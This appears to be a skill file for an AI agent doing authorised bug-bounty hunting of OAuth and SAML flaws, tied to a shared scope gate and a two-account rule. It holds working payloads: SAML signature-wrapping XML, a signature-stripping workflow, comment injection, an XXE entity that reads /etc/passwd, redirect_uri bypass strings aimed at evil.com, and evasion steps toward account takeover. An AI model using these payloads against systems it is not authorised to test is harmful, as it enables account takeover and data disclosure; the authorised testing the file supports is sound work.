---
name: hunt-federation
description: OAuth and SAML attack hunting - redirect_uri bypass, state CSRF, SAML XSW (XSW1-XSW8), signature stripping, comment injection. Wiki-first, FIND schema output.
---

# Hunt: OAuth / SAML / Federation

**Assumes `hunt-core`** for the scope gate, two-account rule, confirmation gate, enumeration limits, stop conditions, wiki protocol, FIND output, and Deadends. Do not re-derive any of that here.

## Wiki

```
qmd_query "OAuth SAML federation redirect_uri bypass XSW signature stripping state CSRF" via wiki-search MCP
```

Hub: [[web-moc]] (live index). Primary page: [[oauth-attacks]]. Payload arsenal: `wiki/payloads/oauth-saml.md`.
Anchors: [[saml-attacks]].

## Attack surface

Entry points:
```
/oauth/authorize  /oauth/token  /oauth/callback  /auth/callback
/saml/  /saml/acs  /sso/saml  /auth/saml/callback
/login?redirect_uri=  /signin?next=
```

**Rank before testing** - most federation payouts come from the top of this list:

1. **redirect_uri handling** - highest yield. This is where the code/token is delivered; a permissive
   match leaks it to an attacker origin and chains straight to ATO.
2. **Signature validation** - is the assertion signature checked at all, and does it cover exactly what
   the parser reads (stripping, comment injection live here).
3. **The XSW1-XSW8 matrix** - signature covers a signed element, the SP trusts a wrapper assertion.
   Automate the eight variants with SAML Raider.
4. **state / CSRF** - a missing or client-only `state` on the OAuth callback enables login-CSRF and
   attacker-to-victim account linking.
5. **OIDC metadata and client leakage** - `.well-known/openid-configuration`, JS bundles, APK resources:
   leaked `client_secret`, extra grant types, unadvertised endpoints.

## SAML Attacks

### Attack 1: XSW - Signature Wrapping
```xml
<!-- Original: legit assertion by user@company.com -->
<!-- Modified: inject evil assertion with admin@company.com before the signed one -->
<saml:Response>
  <saml:Assertion ID="evil">
    <NameID>admin@company.com</NameID>  <!-- Attacker-controlled -->
  </saml:Assertion>
  <saml:Assertion ID="legit">
    <NameID>user@company.com</NameID>
    <ds:Signature><!-- Valid, covers ID=legit --></ds:Signature>
  </saml:Assertion>
</saml:Response>
```
Use SAMLRaider Burp extension for automated XSW1-XSW8 testing.

### Attack 2: Signature Stripping
```bash
# 1. Decode
echo "BASE64_SAML" | base64 -d | xmllint --format - > saml.xml
# 2. Delete entire <Signature> element
# 3. Change NameID to admin@company.com
# 4. Re-encode
base64 -w0 saml.xml
# 5. POST -- if server doesn't verify signature = Critical ATO
```

### Attack 3: Comment Injection
```xml
<NameID>admin<!---->@company.com</NameID>
<!-- Signature covers "admin<!---->@company.com" but parser sees "admin@company.com" -->
```

### Attack 4: XXE in SAML Assertion
```xml
<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<saml:Assertion><NameID>&xxe;</NameID></saml:Assertion>
```

## OAuth Attacks

### redirect_uri Bypass (highest yield)
```
Try: redirect_uri=https://legit.com.evil.com
Try: redirect_uri=https://legit.com/callback/../../../evil
Try: redirect_uri=https://legit.com&redirect_uri=https://evil.com  (param pollution)
Try: encoded chars %2F %40 %23
```

### State CSRF
- Remove `state` parameter entirely - does the flow complete?
- Is `state` validated server-side or only client-side?

### Nonce Replay / Referrer Leak
- Check if on-page resources receive full Referer header containing the access token/code in URL
- Language switchers, analytics, social share buttons loaded post-auth are common culprits

## Methodology

**Setup:** two accounts per `hunt-core` - a victim SSO identity and an attacker identity/client, in
separate browser profiles so SSO cookies never cross.

1. Map all OAuth/SAML entry points
2. Capture a valid SAMLResponse via Burp - decode Base64, inspect XML
3. Test SAML: XSW (SAMLRaider), signature stripping, comment injection, XXE
4. Test OAuth: redirect_uri variations, state removal, nonce replay
5. Check `.well-known/openid-configuration` for OIDC surface
6. Check `client_secret` in JS bundles or APK resources
7. Verify impact: demonstrate ATO or privilege escalation on test account
8. **Distill when confirmed** - a reusable XSW variant or redirect_uri bypass, GENERIC, no client host:
   `python3 scripts/wiki-stage.py --kind technique --slug <slug> --target-page techniques/web/oauth-attacks.md` (SAML findings: `python3 scripts/wiki-stage.py --kind technique --slug <slug> --target-page techniques/web/saml-attacks.md`).

## Chaining and evasion

**Chain:** a permissive `redirect_uri` (host confusion, path traversal, param pollution, or the post-auth
`Referer` leak above) -> steal the authorization code -> exchange it at `/oauth/token` -> full ATO. A
trusted `NameID` / `sub` from a stripped or XSW assertion is itself an auth bypass; hand the resulting
session to `hunt-auth` for reset-poisoning and session follow-through.

**Evasion when the direct attempt is rejected:** cycle the remaining redirect_uri encodings
(`%2F` `%40` `%23`, `legit.com.evil.com`, `legit.com/../evil`, double `redirect_uri=`) before calling it
validated; when XSW1/2 fail, walk XSW3-XSW8 with SAML Raider (each moves the wrapper relative to the
signed element and the Response-vs-Assertion boundary) before declaring signatures enforced.

## Confirmation gate

**NOT confirmation:** a redirect that carries an authorization `code` or `token` in its URL; an IdP or SP
returning `200` on a modified `SAMLResponse`; the assertion "accepted"; the flow completing with `state`
removed; any error, even a revealing one. None of these prove you hold another account.

**IS confirmation:** a token or authenticated session **for another account**, obtained through the flaw -
an authorization code stolen via an attacker-controlled `redirect_uri` and exchanged for that account's
token, or a forged / XSW / signature-stripped assertion that logs you in **as the victim** (admin session
reached). Then exercise the session, and reproduce from scratch in a clean browser profile with no cached
SSO state (per `hunt-core`). If the session vanishes in a clean profile, you replayed your own login.

## Severity

Rated on the session actually obtained, not on what the server merely accepted.

| Outcome | Typical |
|---|---|
| Forged / XSW / stripped assertion logs in as admin (SAML auth bypass) | critical - direct ATO |
| redirect_uri bypass yields a victim's code/token, exchanged to a session | critical / high - ATO |
| Login-CSRF via missing `state` (attacker session linked to a victim) | medium / high |
| Leaked `client_secret` / OIDC misconfig, no cross-account session obtained | low - enables other attacks |

Unauthenticated ATO outranks one needing victim interaction. An assertion the SP accepts that yields no
other-account session is not a finding - it is a Deadend.

## Deadends

```
Append: - [ ] SAML/OAuth on <host> -- XSW1-8 + strip + comment rejected, signature covers NameID;
              redirect_uri strictly validated (no encoding/host/traversal/pollution bypass); state enforced
```

Record which variants you tried, not just that it failed - the next pass needs the boundary.
